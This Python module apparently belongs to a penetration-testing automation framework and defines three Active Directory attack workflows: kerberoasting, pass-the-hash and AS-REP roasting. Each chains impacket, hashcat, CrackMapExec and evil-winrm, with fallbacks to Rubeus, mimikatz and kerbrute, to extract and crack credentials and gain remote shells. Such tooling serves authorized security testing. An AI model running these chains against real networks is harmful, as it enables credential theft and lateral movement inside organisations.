"""Active Directory skills for Excalibur.

Defines composed workflows: kerberoasting, pass_the_hash, asrep_roasting.
"""

from __future__ import annotations

from excalibur.tools.skill import Skill, SkillStep


def _kerberoasting() -> Skill:
    """Kerberoasting attack chain: SPN enumeration -> ticket request -> cracking."""
    return Skill(
        name="kerberoasting",
        description=(
            "Kerberoasting attack workflow. Uses impacket GetUserSPNs to "
            "enumerate service accounts with SPNs and request TGS tickets, "
            "then cracks the extracted Kerberos hashes with hashcat using "
            "the rockyou wordlist. Optionally validates cracked credentials "
            "with CrackMapExec."
        ),
        tool_sequence=[
            SkillStep(
                tool_name="impacket",
                parameter_mapping={
                    "script": "script",
                    "domain": "domain",
                    "username": "username",
                    "password": "password",
                    "dc_ip": "dc_ip",
                    "target": "target",
                },
            ),
            SkillStep(
                tool_name="hashcat",
                parameter_mapping={
                    "hash_file": "tgs_hash_file",
                    "hash_type": "hash_type",
                    "wordlist": "wordlist",
                },
                condition="GetUserSPNs retrieved at least one TGS hash",
            ),
            SkillStep(
                tool_name="crackmapexec",
                parameter_mapping={
                    "protocol": "protocol",
                    "target": "dc_ip",
                    "username": "cracked_user",
                    "password": "cracked_pass",
                    "domain": "domain",
                },
                condition="hashcat cracked at least one Kerberos hash",
            ),
        ],
        fallback_logic=(
            "If impacket GetUserSPNs fails, try Rubeus kerberoast from a "
            "domain-joined Windows host. If hashcat is too slow, fall back "
            "to john with the krb5tgs format."
        ),
        result_aggregation="sequential",
    )


def _pass_the_hash() -> Skill:
    """Pass-the-hash attack chain: hash extraction -> lateral movement."""
    return Skill(
        name="pass_the_hash",
        description=(
            "Pass-the-hash lateral movement workflow. Extracts NTLM hashes "
            "using impacket secretsdump, then uses CrackMapExec to validate "
            "the hashes against multiple targets and identify admin access, "
            "and finally establishes a shell via evil-winrm or psexec."
        ),
        tool_sequence=[
            SkillStep(
                tool_name="impacket",
                parameter_mapping={
                    "script": "script",
                    "target": "target",
                    "domain": "domain",
                    "username": "username",
                    "password": "password",
                },
            ),
            SkillStep(
                tool_name="crackmapexec",
                parameter_mapping={
                    "protocol": "protocol",
                    "target": "target_range",
                    "username": "username",
                    "hash": "ntlm_hash",
                    "domain": "domain",
                },
                condition="secretsdump extracted NTLM hashes",
            ),
            SkillStep(
                tool_name="evil_winrm",
                parameter_mapping={
                    "host": "target_host",
                    "username": "username",
                    "hash": "ntlm_hash",
                },
                condition="CrackMapExec confirmed admin access on a target",
            ),
        ],
        fallback_logic=(
            "If evil-winrm fails, try impacket psexec, wmiexec, or smbexec "
            "with the hash. If secretsdump fails due to insufficient privileges, "
            "try mimikatz sekurlsa::logonpasswords from an elevated context."
        ),
        result_aggregation="sequential",
    )


def _asrep_roasting() -> Skill:
    """AS-REP roasting: find accounts without pre-auth -> crack hashes."""
    return Skill(
        name="asrep_roasting",
        description=(
            "AS-REP roasting attack workflow. Uses impacket GetNPUsers to "
            "identify accounts that do not require Kerberos pre-authentication "
            "and extract their AS-REP hashes. Then cracks the hashes with "
            "hashcat to obtain plaintext passwords."
        ),
        tool_sequence=[
            SkillStep(
                tool_name="impacket",
                parameter_mapping={
                    "script": "script",
                    "domain": "domain",
                    "username": "username",
                    "password": "password",
                    "dc_ip": "dc_ip",
                    "target": "target",
                },
            ),
            SkillStep(
                tool_name="hashcat",
                parameter_mapping={
                    "hash_file": "asrep_hash_file",
                    "hash_type": "hash_type",
                    "wordlist": "wordlist",
                },
                condition="GetNPUsers retrieved at least one AS-REP hash",
            ),
        ],
        fallback_logic=(
            "If impacket GetNPUsers fails, try kerbrute userenum first "
            "to identify valid usernames, then re-run. Alternatively, use "
            "Rubeus asreproast from a domain-joined Windows host."
        ),
        result_aggregation="sequential",
    )


def get_ad_skills() -> list[Skill]:
    """Return all Active Directory skills."""
    return [
        _kerberoasting(),
        _pass_the_hash(),
        _asrep_roasting(),
    ]
